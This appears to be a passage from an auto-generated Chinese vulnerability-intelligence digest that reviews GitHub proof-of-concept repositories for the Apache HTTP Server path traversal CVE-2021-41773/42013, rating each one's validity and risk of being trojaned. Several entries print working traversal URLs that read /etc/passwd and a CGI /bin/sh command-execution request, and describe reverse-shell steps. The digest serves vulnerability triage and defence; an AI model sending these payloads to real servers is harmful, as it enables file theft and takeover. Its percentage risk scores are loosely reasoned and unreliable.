总而言之，这是一个严重的安全漏洞，可能导致敏感信息泄露和远程代码执行。管理员应尽快升级Apache HTTP Server版本或采取其他缓解措施。

**项目地址:** [Maybe4a6f7365/CVE-2021-41773](https://github.com/Maybe4a6f7365/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #11

**来源**: [CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md](../2021/CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and File Disclosure

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like配置，并允许CGI脚本执行(在RCE场景下)。需要能通过网络访问目标服务器的HTTP服务。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如URL编码的双点）的URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器同时启用了CGI脚本执行，则攻击者可能进一步利用此漏洞执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及漏洞利用代码分析，可以确认此漏洞POC的有效性。漏洞库信息明确指出该漏洞已被在野利用。搜索引擎结果中也包含大量关于该漏洞的分析和POC。

**投毒风险：**
提供的代码片段是GNU通用公共许可证的文本，并非实际的漏洞利用代码。因此，无法评估其是否包含恶意代码或投毒风险。投毒的可能性为0%。该漏洞的常见利用方式是通过构造包含`..%2f`或类似编码的URL来绕过路径检查，从而访问服务器上的敏感文件，或者如果开启了CGI，甚至可以执行任意代码。 

**利用方式：**
1.  **路径遍历：** 攻击者构造包含路径遍历字符的URL，例如：`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的`/etc/passwd`文件或其他敏感文件。
2.  **远程代码执行 (RCE):**  如果服务器启用了CGI，攻击者可以将路径遍历与CGI结合，上传恶意CGI脚本，然后通过路径遍历访问该脚本，从而执行任意代码。 例如 `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh` 

**项目地址:** [MrCl0wnLab/SimplesApachePathTraversal](https://github.com/MrCl0wnLab/SimplesApachePathTraversal)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #12

**来源**: [CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md](../2021/CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，Alias配置不当，且CGI脚本启用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。由于路径规范化处理存在缺陷，攻击者可以利用该漏洞将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有被"require all denied"等默认配置保护，攻击者就可以成功访问这些文件。更严重的是，如果为这些Alias路径启用了CGI脚本，攻击者还可以执行远程代码。

**有效性：**
根据漏洞描述，该漏洞利用较为直接，通过构造包含".."的URL进行路径遍历。从搜索结果来看，存在大量的漏洞分析和利用文章，表明该漏洞利用的有效性较高。

**投毒风险：**
漏洞利用代码仅提供了漏洞分析文档、CVSS评分、环境信息、影响评估和缓解措施。其中`steps_performed.md`缺失，无法得知作者是否进行了真实的漏洞利用和测试。代码仓库主要目的是漏洞分析和缓解建议，并声明未在目标VM上安装Apache，因此实际利用代码缺失。综合判断，该仓库中存在作者隐藏恶意代码进行投毒的概率较低，预估为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造恶意的HTTP请求，包含特殊编码的路径，例如`..%2f`或`..\`，绕过服务器的路径检查，访问服务器上的任意文件。
2.  **文件泄露：** 成功利用路径遍历后，攻击者可以读取服务器上的敏感文件，如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以通过路径遍历访问CGI脚本，并执行恶意代码。攻击者可以上传包含恶意代码的CGI脚本，并通过路径遍历执行，从而获取服务器的控制权。

**项目地址:** [MuhammadHuzaifaAsif/security-lab](https://github.com/MuhammadHuzaifaAsif/security-lab)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #13

**来源**: [CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md](../2021/CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md)

## CVE-2021-41773/CVE-2021-42013 Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且开启了CGI支持，Alias配置不当，并且相关目录未进行权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773和CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造包含特殊字符（如`.%2e`或`.%%32%65`）的URL，绕过服务器的路径检查，访问到Alias指令配置以外的文件。如果目标服务器同时开启了CGI支持，攻击者还可以执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2021-41773已经被证实存在，并且在野外被利用。提供的POC代码也通过Docker构建了易受攻击的环境，并提供了利用脚本，证明了该漏洞的可利用性。

**投毒风险：**

分析POC代码，该代码主要用于构建漏洞环境和执行漏洞利用。虽然代码本身看起来直接，但需要注意以下几点：

*   **Docker镜像来源：** POC需要构建Docker镜像。如果Docker镜像不是来自官方或可信来源，则可能包含恶意软件。
*   **执行任意命令：** RCE相关的POC会执行任意命令，如果攻击者修改了POC代码，可能会导致恶意代码执行。
*   **流量劫持风险：** POC通过curl发送特定请求来触发漏洞，如果网络环境被污染，可能导致流量劫持，使得攻击者可以篡改POC行为。
*   **文件篡改风险：** RCE相关的POC会写`/tmp/exploited`文件，如果服务器的`/tmp`目录权限设置不当，攻击者可以在其他用户不知情的情况下，篡改该文件，从而进一步扩大攻击。

综合以上考虑，认为此POC代码存在一定的投毒风险，但整体比例不高，约为10%。

**利用方式：**

1.  **环境搭建：** 使用Dockerfile构建包含漏洞的Apache HTTP Server环境（2.4.49或2.4.50版本）。
2.  **路径遍历：** 构造包含特殊字符的URL，例如：
    *   `/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd` (针对CVE-2021-41773)
    *   `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` (针对CVE-2021-42013)
3.  **文件读取：** 如果路径遍历成功，可以直接读取服务器上的敏感文件。
4.  **远程代码执行（RCE）：** 如果服务器开启了CGI支持，并且允许执行shell脚本，则可以通过路径遍历访问到shell脚本，并执行任意命令。例如，POC中使用了以下命令将字符串写入/tmp/exploited文件中：
    *   `echo “Successfully Exploited” > /tmp/exploited`
5.  **利用链：** 进一步的攻击可以包括反弹shell、权限提升、横向移动等。

**项目地址:** [OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits](https://github.com/OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #14

**来源**: [CVE-2021-41773-Taldrid1_cve-2021-41773.md](../2021/CVE-2021-41773-Taldrid1_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49版本，且存在Alias-like配置，目录未配置'require all denied'，开启CGI脚本支持（RCE利用场景）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符的 URL，访问服务器上受限目录之外的文件。

**有效性：**

提供的 Nmap NSE 脚本 `cve-2021-41773.nse` 似乎有效。它通过发送包含路径遍历字符（`/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`）的 HTTP GET 请求来检测漏洞。如果服务器返回状态码 200 并且响应体包含 `/etc/passwd` 文件的内容（`root:x:0:0:root`），则该脚本将报告目标为易受攻击。

搜索引擎结果也表明此漏洞已被积极利用，并且存在公开的 PoC 代码。

**投毒风险：**

在提供的 Nmap NSE 脚本中，没有明显的投毒代码。脚本的主要功能是发送 HTTP 请求并检查响应内容。该脚本允许用户指定扫描的子网范围和输出文件，但这些参数本身不会引入任何恶意行为。脚本通过判断/etc/passwd文件是否存在root账户判断是否漏洞存在，不会造成其他影响。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（例如，`/.%2e/.%2e/.%2e/`）的 URL，试图绕过服务器的路径规范化逻辑，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码或用户数据。
3.  **远程代码执行（可选）：** 如果服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问并执行任意 CGI 脚本，从而实现远程代码执行。这通常需要结合其他漏洞或配置错误。

**优先级排序理由：**

*   **搜索引擎结果：** 提供了关于漏洞是否被利用的背景信息，以及缓解措施的链接。 *   **漏洞利用代码：** 提供了直接验证漏洞的手段，使我们能够评估其有效性。 *   **漏洞库信息：** 提供了漏洞的官方描述，受影响的版本以及参考链接。

**项目地址:** [Taldrid1/cve-2021-41773](https://github.com/Taldrid1/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #15

**来源**: [CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md](../2021/CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，且Alias-like指令配置不当或未启用"require all denied"保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，访问服务器上Alias-like指令配置以外的文件。如果这些文件没有被“require all denied”等默认安全配置保护，攻击者就可以成功读取它们。更进一步，如果CGI脚本在这些aliased路径上启用，攻击者甚至可以执行远程代码。

**有效性：**
漏洞库信息和搜索引擎结果都表明该漏洞是真实存在的，并且被广泛利用。提供的漏洞利用代码主要是一个README.md文件，描述了一个渗透测试项目，该项目评估了CVE-2021-41773和CVE-2021-42013漏洞。虽然这个README.md文件本身不是直接可用的exp代码，但是它暗示了利用该漏洞进行渗透测试是可行的。搜索引擎结果中也提到存在公开的PoC。

**投毒风险：**
README.md文件描述的是一个渗透测试过程的文档，其中包含使用Nmap、Gobuster等工具进行信息收集和漏洞评估，并没有发现直接的恶意代码。但是考虑到安全风险，该文档存在10%的投毒的可能性，因为不排除作者在文档中故意遗漏或隐藏了某些关键信息，从而误导使用者。例如,引导使用者下载特定版本的工具,该工具已经被植入后门等.

**利用方式：**
1.  **路径遍历：** 攻击者利用`..`等路径遍历字符，绕过服务器的目录限制，访问任意文件。
2.  **文件读取：**  如果目标文件未被`require all denied`等配置保护，攻击者可以读取文件内容，获取敏感信息，如配置文件、源代码等。
3.  **远程代码执行：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并执行任意命令。

利用方式通常涉及构造包含路径遍历字符的URL，例如：
`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
或
`..%2f..%2f..%2fetc/passwd`

攻击者需要根据服务器的具体配置和文件系统结构，调整路径遍历的深度和目标文件名，以成功利用该漏洞。

**项目地址:** [Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013](https://github.com/Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #16

**来源**: [CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且开启了`cgi-bin`或`icons`目录，以及未对Alias指令配置的目录进行“require all denied”限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中，是一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL（包含编码后的路径遍历字符，如`.%2e`），访问服务器上受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，则可能进一步导致远程代码执行。

**有效性：**
提供的`full.py`和`poc.py` PoC 代码尝试利用此漏洞。`full.py`脚本会读取目标列表（hosts.txt），然后针对每个目标，尝试通过 HTTP 和 HTTPS 协议，发送包含路径遍历的请求，访问`/etc/passwd`文件。如果响应中包含`root:*`字符串，则认为目标存在漏洞。

**投毒风险：**
查看提供的文件，`CODEOWNERS`和`README.md`没有发现恶意代码。 `poc.py`本身存在问题, 代码不完整，缺少发起请求的代码,有潜在风险,存在代码缺失,导致投毒或者payload失效，增加攻击者攻击复杂度。 `full.py` 脚本比较完整，但是代码质量不高，存在异常捕获 `except: pass`，可能隐藏一些错误信息。综合判断，该仓库存在一定概率的投毒风险，大约为10%。 主要体现在poc.py的请求代码缺失上，可能导致payload失效。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`.%2e`等路径遍历字符的 URL，绕过服务器对 URL 的规范化处理。
2.  **文件读取：** 成功遍历路径后，攻击者可以读取服务器上的任意文件，例如`/etc/passwd`、web 应用的配置文件等。
3.  **远程代码执行（RCE）：** 如果服务器配置允许 CGI 脚本的执行，攻击者可以上传恶意脚本，并通过路径遍历漏洞访问该脚本，从而在服务器上执行任意代码。为了实现RCE，需要满足以下条件：开启了CGI支持，并且能够通过遍历访问到CGI脚本目录，同时该目录没有被 “require all denied” 保护。

**缓解措施：**
*   升级到 Apache HTTP Server 2.4.50 或更高版本。
*   配置 `Alias` 指令时，确保使用 `Require all denied` 限制对目录的访问。
*   禁用不必要的 CGI 脚本执行。

**项目地址:** [ZephrFish/CVE-2021-41773-PoC](https://github.com/ZephrFish/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #17

**来源**: [CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md](../2021/CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，存在Alias-like指令配置，且相关目录没有“require all denied”保护。CGI脚本需要启用以进行RCE。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞源于Apache HTTP Server 2.4.49/2.4.50中路径规范化处理的缺陷。攻击者可以利用路径遍历漏洞读取服务器上的任意文件。如果服务器同时启用了CGI脚本，则可能导致远程代码执行。

**有效性分析：**

根据漏洞信息和搜索结果，该漏洞在野外被积极利用，具有较高的有效性。POC代码针对Apache 2.4.50版本，尝试利用路径遍历漏洞，首先检测CGI是否禁用，如果禁用则尝试读取/etc/passwd，如果CGI开启，则尝试执行反向shell。根据代码逻辑，该POC有一定的有效性，能检测和利用漏洞。

**投毒风险分析：**

代码中存在轻微的投毒风险。作者可能在LICENSE文件中隐藏了恶意代码，虽然该可能性较低，但是需要考虑到,或者在代码中存在一些对普通用户不友好的代码。 代码整体较为直接，没有明显的恶意行为，但仍需谨慎评估。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`.%%32%65`）的URL，绕过路径规范化检查，从而访问Alias-like指令配置以外的文件。例如，`/.%%32%65/.%%32%65/.%%32%65/etc/passwd`可以尝试读取`/etc/passwd`文件。
2.  **远程代码执行（RCE）：** 如果目标服务器启用了CGI，攻击者可以通过POST请求发送恶意代码，该代码将在服务器上执行。POC代码尝试注入一个反向shell，连接到攻击者指定的IP地址和端口。利用前提是服务器允许执行CGI脚本，并且没有对CGI脚本的执行进行严格的限制。

**项目地址:** [Zyx2440/Apache-HTTP-Server-2.4.50-RCE](https://github.com/Zyx2440/Apache-HTTP-Server-2.4.50-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #18

**来源**: [CVE-2021-41773-adrianmafandy_CVE-2021-41773.md](../2021/CVE-2021-41773-adrianmafandy_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server 2.4.49 Path Traversal & RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了 CGI 脚本支持，并且Alias配置的目录没有 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。攻击者可以利用路径遍历绕过 Alias 指令的限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，并且被访问的目录中存在可执行的 CGI 脚本，攻击者就可以通过构造恶意的 URL 来执行任意代码。

**有效性：**
提供的 POC 代码旨在利用此漏洞。`exploit.py` 脚本首先尝试通过发送包含路径遍历序列的 HTTP 请求来验证目标是否易受攻击，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果从 `/etc/passwd` 文件中检测到 "root:" 和 "bin/" 字符串，则认为目标易受攻击。然后，该脚本尝试利用漏洞通过反向 shell 在目标上执行任意代码。

**利用方式：**
1.  使用路径遍历序列（例如，`.%2e` 或 URL 编码的 `.%2532%2565`）来绕过目录限制。
2.  尝试读取敏感文件，如 `/etc/passwd`，以验证漏洞的存在。
3.  如果服务器配置允许，则利用 CGI 脚本执行任意命令。这通常涉及构造包含命令的 URL，并将该 URL 发送到易受攻击的服务器。
4. 设置监听器，等待反向shell连接。

**投毒风险：**
虽然主要代码看起来直接实现了漏洞利用，但仍然存在一定的投毒风险。可能性大约为 10%。

*   依赖关系：`exploit.py` 脚本依赖于 `requests` 库。虽然 `requests` 是一个流行的 Python 库，但存在供应链攻击的风险。恶意攻击者可能会尝试污染 `requests` 库或类似的依赖项，从而在不知不觉中将恶意代码引入到 `exploit.py` 中。
*   CGI配置的判断：如果目标服务器上未启用 CGI 或 CGI 配置不正确，该漏洞可能无法利用进行 RCE。POC代码中关于CGI的利用可能无法执行.
*   代码审查：在执行任何未经审核的代码（包括此 POC）之前，务必进行彻底的代码审查，以确保其不包含恶意功能。特别注意反向 shell 部分，确保它只执行预期命令。
*  作者动机: 无法完全信任代码作者的真实目的。尽管代码可能有效利用漏洞，但作者可能有意或无意地包含后门或恶意代码。
* 编码问题：URL 编码和解码可能存在问题，导致意外行为。

**项目地址:** [adrianmafandy/CVE-2021-41773](https://github.com/adrianmafandy/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #19

**来源**: [CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md](../2021/CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的 URL，读取服务器上受限目录之外的文件。如果服务器上启用了 CGI 脚本执行，则攻击者可以进一步利用此漏洞执行任意代码。

**有效性:**
根据漏洞库信息，搜索引擎结果，以及漏洞利用代码，提供的POC代码是有效的。漏洞库信息和搜索结果都表明此漏洞已被公开利用。

**投毒风险:**
提供的Go语言漏洞利用代码，主要功能是利用路径遍历漏洞读取`/etc/passwd`文件或执行命令。虽然代码本身实现了漏洞验证和利用功能，但仍然存在一定的投毒风险。

1.  **依赖风险:** Go程序需要编译，编译过程中可能引入恶意依赖。但是本项目代码量较小，依赖风险较低。
2.  **后门代码:** 检查代码后，发现其中并没有明显的恶意代码或后门。然而，攻击者可以修改代码以包含恶意功能，例如上传受害服务器的信息或执行其他恶意操作。
3.  **供应链风险:** 代码托管在第三方平台（GitHub），存在被篡改的风险。如果从不可信的来源下载代码，可能会下载到被修改过的恶意版本。

综合考虑，该仓库存在10%的投毒风险，主要来自潜在的依赖污染和代码篡改。

**利用方式:**
该漏洞的利用方式主要分以下几步：

1.  **路径遍历:** 攻击者构造包含`/.%2e`的恶意URL，尝试绕过Apache的路径规范化检查，从而访问服务器上任意文件。
2.  **信息泄露:** 如果路径遍历成功，攻击者可以读取敏感文件，例如`/etc/passwd`，获取系统用户信息。
3.  **远程代码执行:** 如果服务器启用了CGI脚本，攻击者可以通过POST请求将恶意命令传递给`sh`执行，从而实现远程代码执行。 例如，可以发送包含 `echo; <command>` 的POST请求到 `/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh`。

**项目地址:** [aqiao-jashell/CVE-2021-41773](https://github.com/aqiao-jashell/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #20

**来源**: [CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md](../2021/CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并可能需要启用`mod_cgi`模块且存在`Require all granted`配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。该漏洞源于 `ap_normalize_path` 函数在路径规范化处理上的缺陷，允许攻击者通过构造包含 URL 编码字符（如 `.%2e`）的恶意 URL，绕过路径遍历保护机制，访问服务器文件系统上受限目录之外的文件。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用 `.%2e` 绕过路径规范化，构造恶意 URL 以访问任意文件。例如，`http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd` 可以用来尝试读取 `/etc/passwd` 文件。

2.  **远程代码执行（RCE）：** 如果服务器启用了 `mod_cgi` 模块，攻击者可以通过上传恶意 CGI 脚本并利用路径遍历漏洞执行该脚本，从而实现远程代码执行。这通常需要结合服务器配置中 `cgi-bin` 目录的 `Require all granted` 指令。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，POC 代码的存在进一步验证了其有效性。提供的 README.md 文件详细解释了漏洞原理和利用方法，并提供了搭建漏洞环境的步骤。

**投毒风险：**

虽然提供的 README.md 文件主要包含漏洞说明和环境搭建指导，但是依然存在一定的投毒风险。主要考虑到，如果攻击者修改了环境搭建脚本，例如在安装过程中植入后门，则可能导致受害者搭建一个包含恶意代码的 Apache 服务器。所以需要人工审核确认脚本的安全性，这里认为存在10%的投毒风险。

**总结：**

该漏洞的利用依赖于特定的 Apache 版本和服务器配置。成功利用该漏洞可能导致严重的后果，包括敏感信息泄露和远程代码执行。用户应尽快升级 Apache HTTP Server 版本以修复此漏洞。

**项目地址:** [ashique-thaha/CVE-2021-41773-POC](https://github.com/ashique-thaha/CVE-2021-41773-POC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #21

**来源**: [CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md](../2021/CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并且Alias-like 指令配置不当，未对外部文件进行访问限制，同时开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如`.%%32%65`）的URL，绕过服务器的路径规范化检查，从而访问到Alias-like指令配置目录以外的文件。如果目标服务器未对这些目录的文件进行访问限制（`require all denied`），攻击者就能读取敏感信息。更进一步，如果服务器允许在这些路径下执行CGI脚本，攻击者就可以实现远程代码执行。

**有效性分析：**

漏洞库信息和搜索结果均表明该漏洞已在野外被利用，PoC代码的存在也证实了其可利用性。

**利用方式分析：**

根据漏洞描述和提供的PoC代码，可以总结出以下利用方式：

1.  **路径遍历攻击：** 攻击者构造包含特殊编码的路径，例如：`/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`尝试读取`/etc/passwd`等敏感文件。
2.  **文件读取：**  如果服务器没有对目标文件进行访问限制，攻击者可以直接读取到文件内容。
3.  **远程代码执行（RCE）：** 如果目标路径允许执行CGI脚本，攻击者可以上传恶意脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**投毒风险分析：**

提供的PoC代码主要包含以下文件：

*   `1.rb`：一个 Metasploit 模块，尝试通过 GET 请求访问特定 URI（`http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/test.txt`）。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `2.rb`：另一个 Metasploit 模块，尝试通过 GET 请求获取 PDF 文件内容 (tugas.pdf)。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `Makefile`：包含 Maven 命令，用于编译和执行 Java 代码。该命令执行 `com.shell.ReverseShell` 类，并传递一些参数，包括文件名、IP 地址、路径等。**`com.shell.ReverseShell` 存在潜在的投毒风险，因为它可能包含反向 shell 或其他恶意功能。**
*   `apache_rce.rb`：Metasploit 模块，未完全贴出，但是根据文件名推测是进行远程代码执行的模块，存在一定风险。

综合来看，`Makefile` 中调用的 Java 类 `com.shell.ReverseShell` 是最可疑的部分。如果该类包含恶意代码，例如反向 shell，那么执行此 Makefile 就可能导致受害者系统被控制。其他rb文件目前主要进行get请求，风险较低。

**风险评估：**

虽然大部分代码看起来是用于漏洞利用，但是 `Makefile` 中调用的`com.shell.ReverseShell` 存在潜在风险，如果里面包含恶意代码，比如反向 shell，则有被投毒的可能。因此，存在一定的投毒风险，比例估计为10%。

**项目地址:** [belajarqywok/CVE-2021-41773-MSF](https://github.com/belajarqywok/CVE-2021-41773-MSF)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #22

**来源**: [CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md](../2021/CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在可执行的CGI脚本目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

